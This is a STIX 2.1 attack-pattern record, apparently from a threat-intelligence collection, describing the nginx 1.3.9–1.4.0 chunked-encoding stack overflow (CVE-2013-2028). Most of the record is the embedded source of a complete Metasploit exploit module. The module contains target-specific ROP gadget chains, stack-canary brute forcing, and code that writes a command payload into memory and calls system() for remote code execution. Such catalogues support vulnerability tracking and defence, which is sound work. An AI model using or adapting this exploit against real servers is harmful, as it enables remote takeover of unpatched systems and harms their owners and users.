{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--698814a4-4173-40ab-990c-0fc1c14d199a",
    "created": "2024-08-14T17:00:25.226453Z",
    "modified": "2024-08-14T17:00:25.226457Z",
    "name": "Nginx HTTP Server 1.3.9-1.4.0 Chunked Encoding Stack Buffer Overflow",
    "description": " This module exploits a stack buffer overflow in versions 1.3.9 to 1.4.0 of nginx. The exploit first triggers an integer overflow in the ngx_http_parse_chunked() by supplying an overly long hex value as chunked block size. This value is later used when determining the number of bytes to read into a stack buffer, thus the overflow becomes possible. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/nginx_chunked_size.rb",
            "external_id": "nginx_chunked_size.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2013-2028"
        },
        {
            "source_name": "reference",
            "url": "http://nginx.org/en/security_advisories.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GreatRanking\n\n  include Exploit::Remote::Tcp\n\n  def initialize(info = {})\n\n    super(update_info(info,\n      'Name'           => 'Nginx HTTP Server 1.3.9-1.4.0 Chunked Encoding Stack Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a stack buffer overflow in versions 1.3.9 to 1.4.0 of nginx.\n        The exploit first triggers an integer overflow in the ngx_http_parse_chunked() by\n        supplying an overly long hex value as chunked block size. This value is later used\n        when determining the number of bytes to read into a stack buffer, thus the overflow\n        becomes possible.\n      },\n      'Author'         =>\n        [\n          'Greg MacManus',    # original discovery\n          'hal',              # Metasploit module\n          'saelo'             # Metasploit module\n        ],\n      'DisclosureDate' => '2013-05-07',\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          ['CVE', '2013-2028'],\n          ['OSVDB', '93037'],\n          ['URL', 'http://nginx.org/en/security_advisories.html'],\n          ['PACKETSTORM', '121560']\n        ],\n      'Privileged'     => false,\n      'Payload'        =>\n        {\n          'BadChars'    => \"\\x0d\\x0a\"\n        },\n      'Arch' => ARCH_CMD,\n      'Platform' => 'unix',\n      'Targets'        =>\n        [\n          [ 'Ubuntu 13.04 32bit - nginx 1.4.0', {\n            'CanaryOffset' => 5050,\n            'Offset' => 12,\n            'Writable' => 0x080c7330, # .data from nginx\n            :dereference_got_callback => :dereference_got_ubuntu_1304,\n            :store_callback => :store_ubuntu_1304,\n          }],\n          [ 'Debian Squeeze 32bit - nginx 1.4.0', {\n            'Offset' => 5130,\n            'Writable' => 0x080b4360, # .data from nginx\n            :dereference_got_callback => :dereference_got_debian_squeeze,\n            :store_callback => :store_debian_squeeze\n          } ],\n        ],\n\n      'DefaultTarget' => 0\n  ))\n\n  register_options([\n      OptPort.new('RPORT', [true, \"The remote HTTP server port\", 80])\n    ])\n\n  register_advanced_options(\n    [\n      OptInt.new(\"CANARY\", [false, \"Use this value as stack canary instead of brute forcing it\", 0xffffffff ]),\n    ])\n\n  end\n\n\n  def check\n    begin\n      res = send_request_fixed(nil)\n\n      if res =~ /^Server: nginx\\/(1\\.3\\.(9|10|11|12|13|14|15|16)|1\\.4\\.0)/m\n        return Exploit::CheckCode::Appears\n      elsif res =~ /^Server: nginx/m\n        return Exploit::CheckCode::Detected\n      end\n\n    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout\n      vprint_error(\"Connection failed\")\n      return Exploit::CheckCode::Unknown\n    end\n\n    return Exploit::CheckCode::Safe\n  end\n\n  #\n  # Generate a random chunk size that will always result\n  # in a negative 64bit number when being parsed\n  #\n  def random_chunk_size(bytes=16)\n    return bytes.times.map{ (rand(0x8) + 0x8).to_s(16) }.join\n  end\n\n  def send_request_fixed(data)\n\n    connect\n\n    request = \t\"GET / HTTP/1.1\\r\\n\"\n    request <<\t\"Host: #{Rex::Text.rand_text_alpha(16)}\\r\\n\"\n    request <<\t\"Transfer-Encoding: Chunked\\r\\n\"\n    request <<\t\"\\r\\n\"\n    request <<\t\"#{data}\"\n\n    sock.put(request)\n\n    res = nil\n\n    begin\n      res = sock.get_once(-1, 0.5)\n    rescue EOFError => e\n      # Ignore\n    end\n\n    disconnect\n    return res\n  end\n\n  def store_ubuntu_1304(address, value)\n    chain = [\n      0x0804c415, # pop ecx ; add al, 29h ; ret\n      address, # address\n      0x080b9a38, # pop eax ; ret\n      value.unpack('V').first, # value\n      0x080a9dce, # mov [ecx], eax ; mov [ecx+4], edx ; mov eax, 0 ; ret\n    ]\n    return chain.pack('V*')\n  end\n\n  def dereference_got_ubuntu_1304\n    chain = [\n      0x08094129,         # pop esi; ret\n      0x080c5090,         # GOT for localtime_r\n      0x0804c415,         # pop ecx ; add al, 29h ; ret\n      0x001a4b00,         # Offset to system\n      0x080c360a,         # add ecx, [esi] ; adc al, 41h ; ret\n      0x08076f63,         # push ecx ; add al, 39h ; ret\n      0x41414141,         # Garbage return address\n      target['Writable'], # ptr to .data where contents have been stored\n    ]\n    return chain.pack('V*')\n  end\n\n  def store_debian_squeeze(address, value)\n    chain = [\n      0x08050d93,              # pop edx ; add al 0x83 ; ret\n      value.unpack('V').first, # value\n      0x08067330,              # pop eax ; ret\n      address,                 # address\n      0x08070e94,              # mov [eax] edx ; mov eax 0x0 ; pop ebp ; ret\n      0x41414141,              # ebp\n    ]\n\n    return chain.pack('V*')\n  end\n\n  def dereference_got_debian_squeeze\n    chain = [\n      0x0804ab34,        # pop edi ; pop ebp ; ret\n      0x080B4128 -\n      0x5d5b14c4,        # 0x080B4128 => GOT for localtime_r; 0x5d5b14c4 => Adjustment\n      0x41414141, \t   # padding (ebp)\n      0x08093c75,        # mov ebx, edi ; dec ecx ; ret\n      0x08067330,        # pop eax # ret\n      0xfffb0c80,        # offset\n      0x08078a46,        # add eax, [ebx+0x5d5b14c4] # ret\n      0x0804a3af,\t       # call eax # system\n      target['Writable'] # ptr to .data where contents have been stored\n    ]\n    return chain.pack(\"V*\")\n  end\n\n  def store(buf, address, value)\n    rop = target['Rop']\n    chain = rop['store']['chain']\n    chain[rop['store']['address_offset']] = address\n    chain[rop['store']['value_offset']] = value.unpack('V').first\n    buf << chain.pack('V*')\n  end\n\n  def dereference_got\n\n    unless self.respond_to?(target[:store_callback]) and self.respond_to?(target[:dereference_got_callback])\n      fail_with(Failure::NoTarget, \"Invalid target specified: no callback functions defined\")\n    end\n\n    buf = \"\"\n    command = payload.encoded\n    i = 0\n    while i < command.length\n      buf << self.send(target[:store_callback], target['Writable'] + i, command[i, 4].ljust(4, \";\"))\n      i = i + 4\n    end\n\n    buf << self.send(target[:dereference_got_callback])\n\n    return buf\n  end\n\n  def exploit\n    data = random_chunk_size(1024)\n\n    if target['CanaryOffset'].nil?\n      data << Rex::Text.rand_text_alpha(target['Offset'] - data.size)\n    else\n\n      if not datastore['CANARY'] == 0xffffffff\n        print_status(\"Using 0x%08x as stack canary\" % datastore['CANARY'])\n        canary = datastore['CANARY']\n      else\n        print_status(\"Searching for stack canary\")\n        canary = find_canary\n\n        if canary.nil? || canary == 0x00000000\n          fail_with(Failure::Unknown, \"#{peer} - Unable to find stack canary\")\n        else\n          print_good(\"Canary found: 0x%08x\\n\" % canary)\n        end\n      end\n\n      data <<\tRex::Text.rand_text_alpha(target['CanaryOffset'] - data.size)\n      data <<\t[canary].pack('V')\n      data << Rex::Text.rand_text_hex(target['Offset'])\n\n    end\n\n    data << dereference_got\n\n    begin\n      send_request_fixed(data)\n    rescue Errno::ECONNRESET => e\n      # Ignore\n    end\n    handler\n  end\n\n  def find_canary\n    # First byte of the canary is already known\n    canary = \"\\x00\"\n\n    print_status(\"Assuming byte 0 0x%02x\" % 0x00)\n\n    # We are going to bruteforce the next 3 bytes one at a time\n    3.times do |c|\n      print_status(\"Brute forcing byte #{c + 1}\")\n\n      0.upto(255) do |i|\n        data = \trandom_chunk_size(1024)\n        data <<\tRex::Text.rand_text_alpha(target['CanaryOffset'] - data.size)\n        data <<\tcanary\n        data << i.chr\n\n        unless send_request_fixed(data).nil?\n          print_good(\"Byte #{c + 1} found: 0x%02x\" % i)\n          canary << i.chr\n          break\n        end\n      end\n    end\n\n    if canary == \"\\x00\"\n      return nil\n    else\n      return canary.unpack('V').first\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2013-05-07",
    "x_mitre_platforms": [
        "unix'"
    ]
}